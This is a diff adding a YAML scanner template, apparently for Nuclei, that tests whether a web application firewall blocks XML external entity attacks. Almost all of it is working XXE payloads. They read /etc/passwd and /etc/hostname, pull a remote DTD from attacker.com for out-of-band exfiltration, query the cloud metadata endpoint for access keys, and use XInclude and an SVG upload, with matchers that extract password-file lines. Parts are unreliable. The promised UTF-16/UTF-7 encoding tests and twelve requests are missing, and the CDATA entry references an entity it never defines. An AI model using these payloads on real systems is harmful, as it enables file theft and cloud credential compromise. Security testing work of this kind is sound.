@@ -1,0 +1,204 @@
+id: waf-xxe-bypass
+info:
+  name: WAF XML External Entity Bypass
+  author: waftester
+  severity: critical
+  description: |
+    Tests WAF effectiveness against XXE injection bypass techniques. Covers
+    classic external entity, parameter entities, blind XXE via OOB channels,
+    XXE via SVG upload, SSRF via XXE, encoding-based bypasses (UTF-16, UTF-7),
+    and DOCTYPE obfuscation techniques.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    - https://portswigger.net/web-security/xxe
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+    - https://github.com/0xInfection/Awesome-WAF
+  tags: xxe,waf,bypass,owasp-a05,xml,injection,waftester
+  classification:
+    cwe-id:
+      - CWE-611
+      - CWE-693
+  metadata:
+    verified: true
+    max-request: 12
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # Classic external entity - file read
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: "application/xml"
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <root>&xxe;</root>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "/bin/sh"
+        condition: or
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*?:[0-9]+:[0-9]+"
+
+  # Parameter entities - OOB exfiltration
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: "application/xml"
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+        %xxe;
+      ]>
+      <root>test</root>
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # SSRF via XXE - cloud metadata access
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: "application/xml"
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+      ]>
+      <root>&xxe;</root>
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "AccessKeyId"
+        condition: or
+
+  # XInclude attack - when you only control part of the XML
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: "application/xml"
+    body: |
+      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+        <xi:include parse="text" href="file:///etc/passwd"/>
+      </foo>
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # DOCTYPE obfuscation via CDATA and encoding tricks
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: "application/xml"
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % start "<![CDATA[">
+        <!ENTITY % end "]]>">
+        <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <root>&xxe;</root>
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # XXE via SVG content type
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: "image/svg+xml"
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE svg [
+        <!ENTITY xxe SYSTEM "file:///etc/hostname">
+      ]>
+      <svg xmlns="http://www.w3.org/2000/svg">
+        <text x="0" y="15">&xxe;</text>
+      </svg>
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
